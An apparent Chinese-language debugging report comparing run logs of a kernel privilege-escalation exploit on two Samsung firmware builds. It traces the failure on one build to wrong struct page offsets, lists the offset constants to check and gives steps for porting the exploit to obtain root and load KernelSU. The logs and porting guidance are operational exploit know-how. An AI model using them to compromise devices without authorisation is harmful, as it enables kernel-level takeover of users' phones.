# 运行日志分析：S9280 DZF2 成功 vs OneUI7 BYH7 失败

> 分析日期：2026-08-22
> 原始日志：`07_发布物/run_logs/`（S9280_DZF2_success.txt / BYH7_e1q_fail.txt）
> 结论先行：S9280 DZF2 全链路验证通过（attempt 2/30 成功）；BYH7 失败点在 **pipe 页内 `anon_pipe_buf_ops` 特征匹配（cache gate）**，`pipe_buffer` 结构布局与 DZF2 存在差异，需按 6.1.99 BTF 核对结构体偏移。

---

## 1. S9280 DZF2 成功日志（基线）

设备：SM-S9280 国行，`S9280ZCS6DZF2`，kernel 6.1.145-android14-11-3254743
结果：**attempt 2/30 成功**，完整走到 KernelSU late-load exit=0

### 1.1 成功链路（与 ADAPTATION_GUIDE 阶段地图逐行对应）

```
[+] preload supervisor pid=12953 attempts=30 base_delay=20000 p0_timeout=45 timeout=120
[+] exploit attempt=1/30 pid=18763 delay=50000 p0_offset=scan
    → slide-kaslr-ok source=tracefs slide=000a0000
    → pipe page / mm leak 正常
    → app fops slide attempt=1/1 triggered=0 verified=0   ← 概率性竞态失败（正常）
[-] exploit attempt=1/30 failed status=1

[+] exploit attempt=2/30 pid=29171 delay=50000 p0_offset=0xa0000
    → slide-kaslr-ok source=forced（复用 attempt1 的 KASLR 结果）
    → [*] mm leaked=ffffff8a6b6dc400 object_index=17
    → [*] S928 bank bucket=17 lock=0x52a0 task=0x1000 mode=0
    → [*] sk_buff reclaim sends=16/16 mode=0
    → [*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=9483
    → [*] stage=verifying-kernel-access
    → [*] cfi write ret=35 / cfi read ret=35            ← CFI 验证通过
    → [*] pipe caches normal1k/2k cgroup1k/2k selected=cgroup2k 0xffffff8001cf7100
    → [*] pipe page idx=0 ... cache18=0xffffff8001cf6800 type=ffffffff match=1  ← 特征匹配
    → [*] phys step pipe probe found=1 pipebuf=... idx=90
    → [*] phys step probed read/write done ok=1
    → [*] root direct start uid=2000 fd=3
    → [*] root umh queued wq=... work=... writes=1/1/1/1/1
    → [*] root umh result wake=1 complete=1 retval=0 socket=1   ← ★ root 成功
    → [+] pipe physrw pid=29171 done=1 root=1 rw64=1/1 uid=2000->0
    → [+] stability keeper pid=10314 retaining reclaimed kernel pages
    → [+] exploit completed attempt=2/30
✔ 临时 root 已获得！
ksud late-load: exit=0 → KernelSU 驱动已加载
```

### 1.2 关键结论

1. **首次失败是竞态而非配置错误**：attempt 1 `app fops slide triggered=0` 是概率性竞态失败，KASLR 结果（slide=0xa0000）在 attempt 2 被复用（`source=forced`），这是设计内行为，不是问题。
2. **S9280 的 pipe 页特征**：`cache18=0xffffff8001cf6800`（即 pipe caches 中的 normal2k 地址）、`cache10=dead000000000122`（poison 值）、`type=ffffffff`，`match=1`——这套特征用于在 4K 页内定位 `pipe_buffer` 数组。
3. **mm 泄漏的 bank 定位**：`object_index=17` → `S928 bank bucket=17 lock=0x52a0`，与 `target.h` 的 bank 配置吻合。
4. **root 阶段完整走通**：workqueue 注入（`writes=1/1/1/1/1`）→ UMH 结果 `retval=0 socket=1` → `uid=2000->0`，**没有出现 worklist 竞态 panic**（运行期间自动熄屏生效）。

---

## 2. OneUI7 BYH7 失败日志（对比）

设备：SM-S9210 国行，`S9210ZCU4BYH7`，kernel 6.1.99-android14-11-2370239
结果：attempt 1 竞态失败；attempt 2 走到 CFI 通过，但 **pipe 页 cache gate 失败**，未获 root

### 2.1 失败链路

```
[+] exploit attempt=1/30 pid=15135 p0_offset=scan
    → slide-kaslr-ok source=tracefs slide=00000000
    → app fops slide triggered=0 verified=0   ← 竞态失败（正常）
[-] exploit attempt=1/30 failed

[+] exploit attempt=2/30 pid=24149 p0_offset=0x0
    → slide-kaslr-ok source=forced
    → [*] mm leaked=... object_index=28
    → [-] S928 lock bucket rejected=28 max=27 mode=0   ← 注意：object_index 超界被拒
    → [-] prepare_kernel_page retry 1/2
    → [*] mm leaked=... object_index=5 → S928 bank bucket=5 lock=0x22a0
    → [*] kernel page prepare attempt=2/2 elapsed_ms=6373
    → [*] stage=verifying-kernel-access
    → [*] cfi write ret=35 / cfi read ret=35          ← CFI 通过（与 DZF2 相同）
    → [*] pipe caches ... selected=0xffffff8001cf7100
    → [*] pipe page idx=0..7 cache08/cache18 均非预期，type=ffffff7f/ffffffff match=0
    → [-] phys step cache gate failed slab=0000000000000000 want=0xffffff8001cf7100
    → [*] app fops slide attempt=1/1 triggered=1 verified=0 step=8
[-] exploit attempt=2/30 failed status=1
```

### 2.2 失败根因定位

**失败点在 pipe 页内 `pipe_buffer` 特征匹配，不在 CFI/root 阶段**：

| 检查点 | S9280 (6.1.145) | BYH7 (6.1.99) | 结论 |
|---|---|---|---|
| KASLR slide | 0xa0000 | 0x0 | 正常（0 合法） |
| CFI write/read | ret=35 | ret=35 | **两者一致** |
| pipe caches selected | cgroup2k 0xffffff8001cf7100 | 同 | 一致 |
| pipe page idx=0 cache18 | 0xffffff8001cf6800 (=normal2k) | 0x0 | **BYH7 不匹配** |
| pipe page idx=0 cache10 | dead000000000122 (poison) | fffffffe... 垃圾值 | **BYH7 偏移读错** |
| pipe page idx=0 type | ffffffff (match=1) | ffffffff (match=0) | **BYH7 页内扫描 8 个 idx 全不匹配** |

**核心判断**：BYH7 的 `pipe_buffer` 结构体在页内的**字段偏移/数组步长与 DZF2 不同**（6.1.99 vs 6.1.145），exploit 用 DZF2 的布局去读 BYH7 的 pipe 页，把无关内存当成 `cache18`/`cache10` 读取，导致特征匹配失败。这与 `byh7-target-complete.md` 第 5 节预判一致（"结构体布局在 6.1.99 vs 6.1.145 间可能有差异；若真机跑不到对应阶段，优先核对 BTF 布局"）。

**次要点**：attempt 2 第一次 `mm leaked object_index=28` 超界（`max=27`）被拒，说明 BYH7 的 mm 分配布局与 DZF2 略有差异（可能只是该次分配偶然落到更高阶 slab），重试后 `object_index=5` 正常。这是软性差异，重试可绕过。

### 2.3 根因修正（2026-08-22，对照 SM-S9380 移植经验）

**更精确的定位：`struct page` 字段偏移错误（vmemmap 地址特征），而非笼统的 pipe_buffer 布局。**

SM-S9380 经验（`03_参考研究/SM-S9380_RMG_root_experience.md` §六）给出 FOPS cache gate 失败判据：

> 失败典型 2：`cache08=fffffffe24997a08` —— 读到 **vmemmap 地址**，即 struct page 偏移算错。

对照 BYH7 失败日志：

```
[*] pipe page idx=0 page=ffffff889bb38000 head=fffffffe226ece00
    cache08=fffffffe208aac08 cache10=fffffffe2919de08 cache18=0 cache20=0 type=ffffff7f match=0
```

- `cache08=fffffffe208aac08`、`cache10=fffffffe2919de08` 均以 **`fffffffe` 开头 = vmemmap 区域地址** → struct page 字段偏移读错（把 vmemmap 内容当成 slab_cache 指针）
- S9280 成功对照：`cache08=0000000000000000`、`cache18=ffffff8001cf6800`（正常内核地址）→ 偏移正确

**需核对的四项偏移**（源自 SM-S9380 ZG1 移植结论，BYH7/6.1.99 需单独确认）：

```
STRUCT_PAGE_SIZE              = 0x40
STRUCT_PAGE_COMPOUND_HEAD_OFF = 0x08
STRUCT_SLAB_CACHE_OFF         = 0x08
STRUCT_PAGE_TYPE_OFF          = 0x30
```

**附加因素**：SM-S9380 经验还提示 **Shell 域 vs App 域差异**（cgroup 归属影响 kmalloc 落 cgroup 还是 normal 缓存，与 FOPS 的 kmalloc_cgroup_2k_cache 匹配相关）。BYH7 测试走 App（Shizuku），除偏移外还需考虑运行环境对缓存归属的影响。

---

## 3. 下一步建议

1. **核对 `struct page` 四项偏移**（BYH7 失败的直接根因，§2.3）：用 BTF（`vmlinux_byh7.elf`）反查 6.1.99 内核的 `STRUCT_PAGE_SIZE=0x40`、`STRUCT_PAGE_COMPOUND_HEAD_OFF=0x08`、`STRUCT_SLAB_CACHE_OFF=0x08`、`STRUCT_PAGE_TYPE_OFF=0x30` 是否与 DZF2 一致；若不一致，按 SM-S9380 移植流程（解包 boot.img → BTF 反推 → 对照旧 profile 修正）更新 BYH7 target.h。
2. **核对 `pipe_buffer` 布局**：`pipe/page/offset/len/ops/flags` 字段偏移与数组步长（16/24/32 字节），对照 exploit 源码 `pipe.c` 页内扫描逻辑（在 struct page 偏移修正后如仍不匹配再查）。
3. **核对 `COMPACT_RT_MUTEX_WAITER` 相关偏移**（byh7-target-complete.md 已标注）——若前两步修正后 root 阶段仍失败，优先查此项。
4. **App 域验证**：SM-S9380 经验提示 Shell 域 ≠ App 域（cgroup 归属影响 kmalloc 缓存匹配），BYH7 修正偏移后必须走 App（Shizuku）完整验证，不能只在 adb shell 里测。
5. **重试覆盖**：BYH7 的 `object_index=28 超界` 与 `fops slide` 竞态均可靠多次 attempt 覆盖（attempt 2 里 CFI 已通过，说明链路主体可行，差的只是偏移常量）。
6. **时序**：保持 `APP_MIN_BOOT_UPTIME_SEC=120`（当前已是），不要改小（SM-S9380 实测 60 秒必失败）。

---

## 4. 复现与验证命令

```sh
# 反查 pipe_buffer 布局（BYH7 ELF）
llvm-nm vmlinux_byh7.elf | grep -E "pipe_buf|anon_pipe_buf_ops"
llvm-objdump -d --start-address=<pipe_fcntl 附近> vmlinux_byh7.elf | grep -A20 "pipe_buffer"

# 设备复测（装 App 后熄屏运行，重启后导出日志）
# 期望日志关键行（成功）：
#   [*] pipe page idx=0 ... match=1
#   [*] root umh result wake=1 complete=1 retval=0 socket=1
```
